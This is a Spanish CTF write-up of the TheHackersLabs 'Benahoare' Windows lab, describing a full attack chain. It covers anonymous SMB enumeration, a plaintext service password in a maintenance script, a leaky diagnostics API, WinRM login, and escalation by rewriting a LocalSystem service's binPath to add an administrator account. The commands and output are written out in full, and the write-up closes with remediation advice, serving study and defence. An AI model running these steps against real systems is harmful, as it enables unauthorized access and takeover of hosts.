---
title: "TheHackersLabs: Benahoare"
date: 2026-09-07T20:56:00+02:00
draft: false
description: "Recorrido completo de la máquina Benahoare: enumeración SMB con sesión nula, extracción de credenciales de una cuenta de servicio desde un script de mantenimiento expuesto en un recurso compartido, exposición de la cuenta de servicio en un endpoint de diagnóstico REST, acceso inicial por WinRM y escalada de privilegios abusando de permisos débiles sobre el servicio GuancheVMS."
tags: ["thehackerslabs", "smb", "winrm", "weak-service-permissions"]
categories: ["writeups"]
sistema: ["windows"]
dificultad: "principiante"
---

*La máquina Benahoare de TheHackersLabs simula la infraestructura de videovigilancia de una empresa de seguridad física, y su cadena de ataque nace de un fallo habitual en entornos corporativos: la sobreexposición de recursos de soporte interno. Un recurso SMB accesible sin autenticación entrega un script de PowerShell con la contraseña de una cuenta de servicio en texto plano, y un endpoint de diagnóstico pensado solo para uso interno confirma el nombre de esa cuenta antes incluso de intentar el acceso. Desde ahí, una sesión WinRM legítima destapa una ACL de servicio mal calculada que permite reescribir su binario de arranque y crear un administrador local sin depender de ningún exploit de kernel ni de credenciales adicionales.*

IP objetivo: `10.0.2.59`. IP atacante: `10.0.2.2`. Las flags se muestran ofuscadas para no facilitar la resolución directa a terceros; el objetivo de este artículo es documentar la metodología, no las respuestas.

## Reconocimiento — Descubrimiento de host y escaneo de puertos

Barrido de red para localizar el objetivo dentro del segmento:

<pre class="term-log">
<span class="cmd">$ nmap -sP 10.0.2.0/24</span>
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-07 20:04 +0200
Nmap scan report for 10.0.2.1
Host is up (0.00021s latency).
MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
Nmap scan report for 10.0.2.2
Host is up (0.00018s latency).
MAC Address: 08:00:27:8A:51:A3 (Oracle VirtualBox virtual NIC)
<span class="hl">Nmap scan report for 10.0.2.59
Host is up (0.00047s latency).
MAC Address: 08:00:27:DC:C3:61 (Oracle VirtualBox virtual NIC)</span>
Nmap scan report for 10.0.2.3
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 11.16 seconds
</pre>

Con el objetivo identificado (`10.0.2.59`), se ejecuta un escaneo completo de puertos TCP con detección de servicio, versión, scripts por defecto y sistema operativo:

<pre class="term-log">
<span class="cmd">$ nmap -sSV -A -p- --open 10.0.2.59</span>
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-07 20:13 +0200
Nmap scan report for 10.0.2.59
Host is up (0.00071s latency).
Not shown: 65528 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
<span class="hl">80/tcp    open  http          Microsoft IIS httpd 10.0</span>
|_http-title: El Guanche Security · Central de Videovigilancia
| http-methods:
|   Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
<span class="hl">445/tcp   open  microsoft-ds?</span>
<span class="hl">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
<span class="hl">8080/tcp  open  http          Microsoft IIS httpd 10.0</span>
| http-methods:
|   Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: 403 - Forbidden: Access is denied.
49667/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:DC:C3:61 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Microsoft Windows Server 2019 (97%), Microsoft Windows 10 1803 (91%), Microsoft Windows 10 1903 - 22H2 (91%), Microsoft Windows 10 22H2 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
<span class="hl">|nbstat: NetBIOS name: BENAHOARE-THL, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:dc:c3:61 (Oracle VirtualBox virtual NIC)</span>
| smb2-time:
|   date: 2026-09-07T18:16:55
|_  startdate: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required

TRACEROUTE
HOP RTT     ADDRESS
1   0.71 ms 10.0.2.59

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 228.60 seconds
</pre>

Seis puertos abiertos: **80/HTTP** (IIS 10.0, portal corporativo "El Guanche Security · Central de Videovigilancia"), **135/MSRPC**, **139/NetBIOS**, **445/SMB**, **5985/WinRM** (HTTPAPI) y **8080/HTTP** (segunda instancia IIS, con acceso a raíz denegado). El hostname `BENAHOARE-THL` confirma un Windows Server 2019 fuera de dominio (sin `startdate` en `smb2-time` ni indicios de controlador de dominio), y `message signing enabled but not required` deja SMB relay como vector teórico a tener en cuenta, aunque no se explota en este recorrido.

## Enumeración SMB — Sesión nula y recurso compartido

Se comprueba si el servicio SMB permite sesión nula o autenticación anónima:

<pre class="term-log">
<span class="cmd">$ smbmap -H 10.0.2.59 -u null -p null</span>

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \\  |: \.        |(|  _  \\ |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \  \   /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)

    SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
    https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 0 authenticated session(s)
[+] IP: 10.0.2.59:445	Name: 10.0.2.59        Status: Authenticated
    Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                                	NO ACCESS	Remote Admin
	C$                                                    	NO ACCESS	Default share
	IPC$                                                  	READ ONLY	Remote IPC
	<span class="hl">Soporte_Tecnico                                       	READ ONLY	Scripts y manuales de soporte</span>
[*] Closed 1 connections
</pre>

Con credenciales nulas se obtiene acceso de lectura al recurso `Soporte_Tecnico`, no listado entre los recursos administrativos por defecto. Se conecta con `impacket-smbclient` como usuario invitado para inspeccionar el contenido:

<pre class="term-log">
<span class="cmd">$ impacket-smbclient -no-pass guest@10.0.2.59</span>
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands

<span class="cmd"># use Soporte_Tecnico</span>
<span class="cmd"># ls</span>
drw-rw-rw-          0  Sat Aug  8 10:40:13 2026 .
drw-rw-rw-          0  Sat Aug  8 10:40:13 2026 ..
<span class="hl">-rw-rw-rw-         89  Sat Aug  8 10:40:13 2026 nota_soporte.txt
-rw-rw-rw-        541  Sat Aug  8 10:40:13 2026 Reiniciar-Camaras.ps1</span>
<span class="cmd"># get nota_soporte.txt</span>
<span class="cmd"># get Reiniciar-Camaras.ps1</span>
<span class="cmd"># exit</span>
</pre>

Dos archivos: una nota interna y un script de PowerShell de mantenimiento.

<pre class="term-log">
<span class="cmd">$ cat nota_soporte.txt</span>
Si las camaras dejan de responder, ejecutar el script de reinicio. Ref: ticket #4470
</pre>

<pre class="term-log">
<span class="cmd">$ cat Reiniciar-Camaras.ps1</span>
# =========================================================
# Script de mantenimiento - El Guanche Security S.L.
# Reinicio del servicio de camaras GuancheVMS
# Autor: Rayco (Sistemas)
# =========================================================

Write-Host "Reiniciando servicio de camaras..." -ForegroundColor Yellow

# Credenciales de la cuenta de servicio de camaras
<span class="hl-green">$password = ConvertTo-SecureString "C4m4ras2023!" -AsPlainText -Force</span>

Restart-Service -Name "GuancheVMS" -Force

Write-Host "Servicio reiniciado." -ForegroundColor Green
</pre>

El script contiene una contraseña en texto plano (<code>C4m4ras2023!</code>) correspondiente a una cuenta de servicio de cámaras, expuesta por un recurso SMB de lectura pública destinado a documentación de soporte. Queda pendiente identificar el nombre exacto de esa cuenta.

## Enumeración web — Fuzzing de la API en el puerto 8080

La raíz de `8080` devuelve `403 Forbidden`, pero el servicio responde a rutas concretas. Se hace fuzzing de directorios:

<pre class="term-log">
<span class="cmd">$ ffuf -u http://10.0.2.59:8080/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -mc 200,301,302 -t 50</span>

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.0.2.59:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200,301,302
________________________________________________

<span class="hl">api                     [Status: 301, Size: 149, Words: 9, Lines: 2, Duration: 8ms]</span>
</pre>

Se enumera la ruta `/api/` con extensiones habituales de backend:

<pre class="term-log">
<span class="cmd">$ ffuf -u http://10.0.2.59:8080/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -e .json,.php,.html -mc 200,301,302 -t 50</span>

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.0.2.59:8080/api/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
 :: Extensions       : .json .php .html
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200,301,302
________________________________________________

<span class="hl">diagnostics.json        [Status: 200, Size: 822, Words: 143, Lines: 24, Duration: 25ms]</span>
</pre>

Un endpoint de diagnóstico expuesto sin autenticación.

<pre class="term-log">
<span class="cmd">$ curl -s http://10.0.2.59:8080/api/diagnostics.json | python3 -m json.tool</span>
{
    "service": "GuancheVMS Diagnostics API",
    "version": "4.2.1",
    "status": "running",
    "uptime_seconds": 486233,
    "host": {
        "hostname": "BENAHOARE-THL",
        "os": "Windows Server 2019 Standard",
        <span class="hl-green">"service_account": "svc_camaras",</span>
        "install_path": "C:\\Program Files\\GuancheVMS"
    },
    "cameras": [
        { "id": "CAM-01", "zone": "Recepcion", "status": "online",  "fps": 25 },
        { "id": "CAM-02", "zone": "Almacen",   "status": "online",  "fps": 25 },
        { "id": "CAM-03", "zone": "Parking",   "status": "online",  "fps": 25 },
        { "id": "CAM-04", "zone": "Muelle",    "status": "offline", "fps": 0  }
    ],
    "storage": {
        "retention_days": 30,
        "used_percent": 61
    },
    "notes": "Diagnostics endpoint. Internal use only. Do not expose service_account in production responses (ticket #4468)."
}
</pre>

El campo `service_account` confirma el nombre de la cuenta de servicio: `svc_camaras`. El propio campo `notes` documenta que este endpoint no debería exponer esa información en producción (ticket #4468), lo que junto al ticket #4470 de la nota de soporte sugiere una organización consciente del problema pero que no lo ha corregido. Con usuario y contraseña ya identificados de dos fuentes independientes (script SMB y API REST), se dispone de un par de credenciales completo: `svc_camaras:C4m4ras2023!`.

## Acceso inicial — WinRM con la cuenta de servicio

El puerto `5985` (WinRM) está abierto, por lo que se prueban las credenciales directamente con Evil-WinRM:

<pre class="term-log">
<span class="cmd">$ evil-winrm -i 10.0.2.59 -u svc_camaras -p 'C4m4ras2023!'</span>

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="cmd">*Evil-WinRM* PS C:\Users\svc_camaras\Documents&gt; whoami /all</span>

USER INFORMATION
----------------

User Name                 SID
========================== =============================================
<span class="hl-green">benahoare-thl\svc_camaras  S-1-5-21-3365348192-2654475242-4043242444-1000</span>

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
===================================== ================ ============ ==================================================
Everyone                              Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users       Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                         Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                  Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users      Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization        Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account            Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication      Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label           S-1-16-8192

PRIVILEGES INFORMATION
----------------------

Privilege Name                 Description                    State
=============================== ============================== ========
SeChangeNotifyPrivilege        Bypass traverse checking        Enabled
SeIncreaseWorkingSetPrivilege  Increase a process working set  Enabled
</pre>

Acceso confirmado como `svc_camaras`, usuario local sin privilegios especiales más allá de la pertenencia a `Remote Management Users` (necesaria para WinRM). El flag `user.txt` está en el escritorio de esta cuenta y se recupera más adelante junto al de `root`.

## Escalada de privilegios — Permisos débiles sobre el servicio GuancheVMS

La enumeración de servicios vía WMI/CIM falla por permisos insuficientes:

<pre class="term-log">
<span class="cmd">*Evil-WinRM* PS C:\Users\svc_camaras\Documents&gt; Get-CimInstance -ClassName Win32_Service | Where-Object {$_.PathName -notlike "*System32*"} | Select-Object Name, PathName, StartName, StartMode</span>
Access denied
    + CategoryInfo          : PermissionDenied: (root\cimv2:Win32_Service:String) [Get-CimInstance], CimException
    + FullyQualifiedErrorId : HRESULT 0x80041003,Microsoft.Management.Infrastructure.CimCmdlets.GetCimInstanceCommand
</pre>

Se recurre a una vía alternativa, leyendo directamente el registro de servicios:

<pre class="term-log">
<span class="cmd">*Evil-WinRM* PS C:\Users\svc_camaras\Documents&gt; Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\*\ -ErrorAction SilentlyContinue | Where-Object { $_.ImagePath -and $_.ImagePath -notmatch "system32" } | Select-Object PSChildName, ImagePath</span>

PSChildName        ImagePath
-----------        ---------
<span class="hl">GuancheVMS         cmd.exe /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</span>
MDCoreSvc          "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26080.3-0\MpDefenderCoreService.exe"
NetTcpPortSharing  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe
PerfHost           C:\Windows\SysWow64\perfhost.exe
Sense              "C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"
TrustedInstaller   C:\Windows\servicing\TrustedInstaller.exe
WdNisSvc           "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26080.3-0\NisSrv.exe"
WinDefend          "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26080.3-0\MsMpEng.exe"
WMPNetworkSvc      "C:\Program Files\Windows Media Player\wmpnetwk.exe"
</pre>

El `ImagePath` de `GuancheVMS` llama la atención: en lugar de apuntar a un ejecutable, ejecuta un comando `reg add` a través de `cmd.exe`, señal de que ya se ha manipulado o de que el binario original delega tareas de arranque a comandos de registro. Se inspecciona su configuración completa:

<pre class="term-log">
<span class="cmd">*Evil-WinRM* PS C:\Users\svc_camaras\Documents&gt; sc.exe qc GuancheVMS</span>
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: GuancheVMS
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        <span class="hl">BINARY_PATH_NAME   : cmd.exe /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</span>
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : GuancheVMS Camera Service
        DEPENDENCIES       :
        <span class="hl">SERVICE_START_NAME : LocalSystem</span>
</pre>

El servicio arranca con `SERVICE_START_NAME: LocalSystem`, es decir, cualquier comando que ejecute su `BINARY_PATH_NAME` corre con privilegios de sistema. El ejecutable legítimo en disco está bien protegido:

<pre class="term-log">
<span class="cmd">*Evil-WinRM* PS C:\Users\svc_camaras\Documents&gt; icacls "C:\Program Files\GuancheVMS\GuancheVMS.exe"</span>
C:\Program Files\GuancheVMS\GuancheVMS.exe NT AUTHORITY\SYSTEM:(I)(F)
                                            BUILTIN\Administrators:(I)(F)
                                            BUILTIN\Users:(I)(RX)
                                            APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                            APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
Successfully processed 1 files; Failed processing 0 files

<span class="cmd">*Evil-WinRM* PS C:\Users\svc_camaras\Documents&gt; icacls "C:\Program Files\GuancheVMS"</span>
C:\Program Files\GuancheVMS NT SERVICE\TrustedInstaller:(I)(F)
                             NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
                             NT AUTHORITY\SYSTEM:(I)(F)
                             NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                             BUILTIN\Administrators:(I)(F)
                             BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                             BUILTIN\Users:(I)(RX)
                             BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                             CREATOR OWNER:(I)(OI)(CI)(IO)(F)
                             APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                             APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
                             APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
                             APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
Successfully processed 1 files; Failed processing 0 files
</pre>

Tanto el ejecutable como el directorio solo permiten lectura y ejecución a `Users`, sin opción de sobrescritura. El fallo no está en el sistema de archivos, sino en la ACL del propio objeto de servicio en el SCM (Service Control Manager), que se audita con `sdshow`:

<pre class="term-log">
<span class="cmd">*Evil-WinRM* PS C:\Users\svc_camaras\Documents&gt; sc.exe sdshow GuancheVMS</span>
<span class="hl">D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCDCLCSWRPWPLOCRRC;;;S-1-5-21-3365348192-2654475242-4043242444-1000)</span>
</pre>

La última ACE de la SDDL concede a la SID `S-1-5-21-3365348192-2654475242-4043242444-1000` —el propio `svc_camaras`— los derechos `CC` (crear servicio hijo), `DC` (eliminar), `LC` (listar estado), `SW` (enumerar dependientes), `RP`/`WP` (leer y **escribir** parámetros, incluido `BINARY_PATH_NAME`), `LO` (bloquear estado) y `CR` (permisos genéricos de control). En concreto, `WP` sobre este objeto es lo que permite reconfigurar el binario de arranque del servicio sin ser administrador: un caso de **weak service permissions** por una ACL mal calculada al desplegar `GuancheVMS`, probablemente para que la propia cuenta de servicio pudiera autorreiniciarse.

### Reconfiguración del binario del servicio

Se aprovecha el permiso `WP` para sustituir el `binPath` por un comando que crea un usuario local y lo añade al grupo de Administradores:

<pre class="term-log">
<span class="cmd">*Evil-WinRM* PS C:\Users\svc_camaras\Documents&gt; sc.exe config GuancheVMS binPath= "cmd.exe /c net user Ne0t3k P4ssHT4!2026 /add &amp;&amp; net localgroup Administrators Ne0t3k /add"</span>
<span class="hl-green">[SC] ChangeServiceConfig SUCCESS</span>

<span class="cmd">*Evil-WinRM* PS C:\Users\svc_camaras\Documents&gt; sc.exe start GuancheVMS</span>
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
</pre>

El arranque devuelve el error 1053, pero es el comportamiento esperado y no indica que el ataque haya fallado: `cmd.exe /c net user ... /add` no implementa la interfaz `ServiceMain` que el Service Control Manager necesita para confirmar el arranque, así que el SCM agota el tiempo de espera y reporta el timeout. Sin embargo, el comando ya se lanzó como `LocalSystem` antes de ese timeout, con tiempo suficiente para completar la creación del usuario. Se revierte el `binPath` original para dejar el servicio en un estado consistente:

<pre class="term-log">
<span class="cmd">*Evil-WinRM* PS C:\Users\svc_camaras\Documents&gt; sc.exe config GuancheVMS binPath= "cmd.exe /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"</span>
[SC] ChangeServiceConfig SUCCESS

<span class="cmd">*Evil-WinRM* PS C:\Users\svc_camaras\Documents&gt; sc.exe start GuancheVMS</span>
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
</pre>

Se verifica que el usuario se creó correctamente y quedó incluido en el grupo de administradores:

<pre class="term-log">
<span class="cmd">*Evil-WinRM* PS C:\Users\svc_camaras\Documents&gt; net user Ne0t3k</span>
User name                    Ne0t3k
Full Name
Comment
User's comment
Country/region code           000 (System Default)
Account active                Yes
Account expires               Never

Password last set             9/7/2026 11:36:57 AM
Password expires              10/19/2026 11:36:57 AM
Password changeable           9/7/2026 11:36:57 AM
Password required             Yes
User may change password      Yes

Workstations allowed          All
Logon script
User profile
Home directory
Last logon                    Never

Logon hours allowed           All

<span class="hl-green">Local Group Memberships       *Administrators       *Users</span>
Global Group memberships      *None
The command completed successfully.

<span class="cmd">*Evil-WinRM* PS C:\Users\svc_camaras\Documents&gt; net localgroup Administrators</span>
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------
Administrator
<span class="hl-green">Ne0t3k</span>
The command completed successfully.
</pre>

`Ne0t3k` figura como miembro activo de `Administrators`. La escalada se completó pese al mensaje de error, confirmando que el 1053 es ruido operativo del SCM y no un indicador fiable de éxito o fracaso al abusar de este tipo de servicios.

## Acceso con privilegios administrativos

Con el usuario ya creado, se abre una nueva sesión WinRM directamente como `Ne0t3k`:

<pre class="term-log">
<span class="cmd">$ evil-winrm -i 10.0.2.59 -u Ne0t3k -p 'P4ssHT4!2026'</span>

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="cmd">*Evil-WinRM* PS C:\Users\Ne0t3k\Documents&gt; whoami</span>
<span class="hl-green">benahoare-thl\ne0t3k</span>

<span class="cmd">*Evil-WinRM* PS C:\Users\Ne0t3k\Documents&gt; whoami /groups</span>

GROUP INFORMATION
-----------------

Group Name                                                Type             SID          Attributes
========================================================== ================ ============ ==============================================================
Everyone                                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
<span class="hl">NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114 Mandatory group, Enabled by default, Enabled group</span>
BUILTIN\Users                                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
<span class="hl-green">BUILTIN\Administrators                                     Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner</span>
NT AUTHORITY\NETWORK                                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account                                 Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication                           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label                 Label            S-1-16-12288

<span class="cmd">*Evil-WinRM* PS C:\Users\Ne0t3k\Documents&gt; whoami /priv</span>

PRIVILEGES INFORMATION
----------------------

Privilege Name                               Description                                                          State
============================================= ==================================================================== ========
SeIncreaseQuotaPrivilege                     Adjust memory quotas for a process                                  Enabled
SeSecurityPrivilege                          Manage auditing and security log                                    Enabled
SeTakeOwnershipPrivilege                     Take ownership of files or other objects                            Enabled
SeLoadDriverPrivilege                        Load and unload device drivers                                      Enabled
SeSystemProfilePrivilege                     Profile system performance                                          Enabled
SeSystemtimePrivilege                        Change the system time                                              Enabled
SeProfileSingleProcessPrivilege              Profile single process                                               Enabled
SeIncreaseBasePriorityPrivilege              Increase scheduling priority                                        Enabled
SeCreatePagefilePrivilege                    Create a pagefile                                                    Enabled
SeBackupPrivilege                            Back up files and directories                                       Enabled
SeRestorePrivilege                           Restore files and directories                                       Enabled
SeShutdownPrivilege                          Shut down the system                                                 Enabled
<span class="hl">SeDebugPrivilege                             Debug programs                                                       Enabled</span>
SeSystemEnvironmentPrivilege                 Modify firmware environment values                                   Enabled
SeChangeNotifyPrivilege                      Bypass traverse checking                                             Enabled
SeRemoteShutdownPrivilege                    Force shutdown from a remote system                                  Enabled
SeUndockPrivilege                            Remove computer from docking station                                 Enabled
SeManageVolumePrivilege                      Perform volume maintenance tasks                                     Enabled
<span class="hl">SeImpersonatePrivilege                       Impersonate a client after authentication                            Enabled</span>
SeCreateGlobalPrivilege                      Create global objects                                                Enabled
SeIncreaseWorkingSetPrivilege                Increase a process working set                                       Enabled
SeTimeZonePrivilege                          Change the time zone                                                 Enabled
SeCreateSymbolicLinkPrivilege                Create symbolic links                                                Enabled
SeDelegateSessionUserImpersonatePrivilege    Obtain an impersonation token for another user in the same session   Enabled
</pre>

Token completo de administrador local, con `SeDebugPrivilege` e `SeImpersonatePrivilege` habilitados: control total sobre el host confirmado.

## Localización de flags

<pre class="term-log">
<span class="cmd">*Evil-WinRM* PS C:\Users\Ne0t3k\Documents&gt; Get-ChildItem -Path C:\Users -Recurse -Include *.txt -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "flag|user|root|local|proof" }</span>

    Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        8/8/2026   1:42 AM             35 root.txt

    Directory: C:\Users\svc_camaras\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        8/7/2026  11:27 AM             32 user.txt

<span class="cmd">*Evil-WinRM* PS C:\Users\Ne0t3k\Documents&gt; type C:\Users\svc_camaras\Desktop\user.txt</span>
<span class="hl-green">THL{*}</span>

<span class="cmd">*Evil-WinRM* PS C:\Users\Ne0t3k\Documents&gt; type C:\Users\Administrator\Desktop\root.txt</span>
<span class="hl-green">THL{*}</span>
</pre>

*(Flags ofuscadas intencionadamente en este write-up.)*

## Conclusión

La cadena de compromiso combina tres fallos independientes, ninguno crítico por sí solo, pero encadenables entre sí: un recurso SMB de solo lectura (`Soporte_Tecnico`) accesible sin autenticación que expone un script de PowerShell con una contraseña de cuenta de servicio en texto plano; un endpoint de diagnóstico REST sin autenticación en el puerto 8080 que confirma el nombre de esa misma cuenta de servicio (`svc_camaras`), pese a que sus propias notas internas advierten de no exponerla; y una ACL de servicio (`GuancheVMS`) mal configurada que concede permisos de escritura (`WP`) sobre su `BINARY_PATH_NAME` a la propia cuenta de servicio, permitiendo reconfigurarlo para ejecutar comandos arbitrarios como `LocalSystem`.

Como medidas correctivas: eliminar sesiones nulas y revisar permisos de recursos SMB expuestos a todo el dominio o red, no almacenar credenciales en texto plano en scripts de mantenimiento (usar un gestor de secretos o `gMSA`), retirar o proteger con autenticación cualquier endpoint de diagnóstico en producción, y auditar periódicamente las ACL de servicios con `sc.exe sdshow` o herramientas como `PowerUp`/`WinPEAS` para detectar `WP`/`GENERIC_WRITE` concedidos a cuentas no administrativas.
